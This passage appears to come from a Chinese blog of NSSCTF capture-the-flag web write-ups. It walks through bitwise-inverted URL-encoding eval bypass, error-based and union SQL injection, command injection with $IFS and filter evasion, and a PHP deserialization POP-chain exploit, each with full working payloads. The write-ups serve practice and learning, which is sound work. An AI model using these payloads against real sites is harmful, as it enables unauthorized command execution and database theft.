符合要求就会被 eval 执行</p><blockquote><p>这里记录一些 <strong>url 编码取反绕过正则表达式</strong> 的一些知识点</p><p>1、url 编码取反绕过：就是将 php 代码 url 编码后取反，我们传入参数后服务端进行 url 解码，这时候由于取反后，会解码成不可打印字符，这样我们就会绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(&#x27;phpinfo&#x27;);</span><br><span class="line">echo urlencode(~&#x27;phpinfo&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b04.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>2、对于 php，形如 (func_name)()，其中 func_name 可以是字符串，会执行这个 func</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)()</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br></pre></td></tr></table></figure></blockquote><p>了解完这些我们尝试构建 payload 获取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)# (~&#x27;system&#x27;)</span><br><span class="line">(~%93%8C%DF%D0)# (~&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b05.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试获取 flllllaaaaaaggggggg 里的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);<span class="comment">#%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);</span><br><span class="line"><span class="comment">#%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure><p>得到 flag<img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b06.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p fa9e48b7-5029-43ad-854d-c5de9cd0fb3c>NSSCTF</p><h2 id="swpuctf-2021-新生赛error"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛error">#</a> [SWPUCTF 2021 新生赛] error</h2><p>比较常规的报错注入，熟悉一下 payload</p><p>获得当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select database())))) -- s</span><br></pre></td></tr></table></figure><p><img src alt><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b07.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b07"></p><p>爆库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(schema_name) from information_schema.schemata)))) -- s</span><br></pre></td></tr></table></figure><p>但是单次查询的字符长度受限最好是搭配 substr 限长和控制回显的是哪一部分，本题没用上别的数据库，就不把所有数据库都查出来了</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b08.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆出 test_db 数据库下的所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;)))) -- s</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b09.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆出 test_tb 的所有字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27; and table_schema=&#x27;test_db&#x27;)))) -- s</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b10.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查询 flag！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select substr((select flag from test_tb),1,31))))) -- s#前31位</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b11.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and (select extractvalue(1, concat(&#x27;~&#x27;, (select substr((select flag from test_tb),31,62))))) -- s#剩下的</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b12.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="gxyctf-2019ping-ping-ping"><a class="markdownIt-Anchor" href="#gxyctf-2019ping-ping-ping">#</a> [GXYCTF 2019]Ping Ping Ping</h2><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b13.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>他说 why not try <a href="http://bjut.edu.xn--cnbjut-4l2j812eefal299bdvif9c.edu.cn">bjut.edu.cn 那就尝试输入 bjut.edu.cn</a></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b14.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显内容长这样</p><p>上面有个问句 php 可以执行系统函数？那就尝试使用系统函数例如 ls 等</p><p>输入 1;ls</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b15.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到有 index.php 和 flag.php</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b16.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>空格被过滤了，那就用 $IFS$1 来替代空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b17.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看源代码</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b18.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到被过滤的字符</p><blockquote><p>做一些记录：</p><p>第一个 if 里的 \x 是 16 进制字符开头</p><p>第二个 if 匹配的是空格</p><p>第三个是 bash</p><p>第四个是 flag。 <code>.</code>  是匹配一个不是 <code>\n</code>  的字符， <code>*</code>  是前一个匹配符匹配 0 到无数次。就是一个字符串里面 flag 这四个字符不能顺序出现在任意位置中，不管中间间隔了什么，他们连起来就是 flag，就会输出 die (“fxck your flag!”);</p></blockquote><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php</span><br></pre></td></tr></table></figure><p>然后查看网页源代码</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b19.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 9a6ece93-3ef0-4a23-bf5e-4585f4fce12e>NSSCTF</p><h2 id="swpuctf-2021-新生赛pop"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pop">#</a> [SWPUCTF 2021 新生赛] pop</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还没完全 get 到 pop 链的做法，还是多刷点题慢慢体会吧</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m = <span class="string">&#x27;Getflag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b20.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p fa1ded52-88f2-4369-bcd4-ddbde5defb83>NSSCTF</p><p>这里再记录一下魔术方法，加深一下印象</p><blockquote><p>__sleep () // 使用 serialize 时触发</p><p>__destruct () // 对象被销毁时触发</p><p>__call () // 在对象上下文中调用不可访问的方法时触发</p><p>__callStatic () // 在静态上下文中调用不可访问的方法时触发</p><p>__get () // 用于从不可访问的属性读取数据</p><p>__set () // 用于将数据写入不可访问的属性</p><p>__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发</p><p>__unset () // 在不可访问的属性上使用 unset () 时触发</p><p>__toString () // 把类当作字符串使用时触发</p><p>__invoke () // 当脚本尝试将对象调用为函数时触发</p></blockquote><h2 id="litctf-2023ping"><a class="markdownIt-Anchor" href="#litctf-2023ping">#</a> [LitCTF 2023]Ping</h2><p>输入 127.0.0.1;ls</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b21.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>前端？？？直接禁用 JavaScript 再次尝试</p><p>禁用完就可以了</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b22.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>直接 127.0.0.1;cat /flag</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b23.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 945f7b8a-f706-43ec-8ae0-0eccc40f135d>NSSCTF</p><h2 id="swpuctf-2021-新生赛sql"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛sql">#</a> [SWPUCTF 2021 新生赛] sql</h2><p>网页提示参数是 wllm，wllm=1 有回显 name 和 password</p><p>wllm=1’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the  manual that corresponds to your MariaDB server version for the right  syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>闭合单引号</p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b24.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>存在过滤？用 <code>?wllm=1'%23</code>  就回显正常了</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; or 1=1%23</span><br></pre></td></tr></table></figure><p>发现是非法操作，可能是空格被过滤了，把空格替换成 /**/ 或者 +</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27;/**/order/**/by/**/3%23#回显正常</span><br><span class="line">?wllm=1&#x27;/**/order/**/by/**/4%23#Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>联合注入 union select 查找回显位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b25.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查找当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,database()%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b26.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查找当前数据库所有表名，等于号换成单词 like</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b27.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b28.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b29.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>只有半截，搭配着 substr 来获取 flag，本题 substr 好像被过滤了，用 mid 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),20,20)/**/from/**/LTLT_flag%23</span><br><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),30,20)/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p><img src alt><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b30.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b30"></p><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b31.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="swpuctf-2021-新生赛finalrce"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛finalrce">#</a> [SWPUCTF 2021 新生赛] finalrce</h2><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b32.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>网上查了，本题用的是 linux 里 tee 命令，记录一下</p><blockquote><p>tee 将想要执行的命令写入到一个文件里面，然后再去访问这个文件，以此来执行这个命令。</p></blockquote><p>本题 ls 被禁用了，|\s 可以替代 ls，| 是执行以下命令的意思</p><p>这里尝试获取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=l\s / | tee 1.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b33.png" class="lazyload" data-srcset="/2024/01/20/NSSCTF%E5%88%B7%E9%A2%982/b33.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>获取 flllllaaaaaaggggggg 里的内容</p><p>本题禁用了 cat 但是没有禁用 tac，tac 就是 cat 反过来，反向读取文件，把文件的最后一行放在第一行</p><p>因为禁用了 la，所以在 l 和 a 之间加一个 \，不然就没有办法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 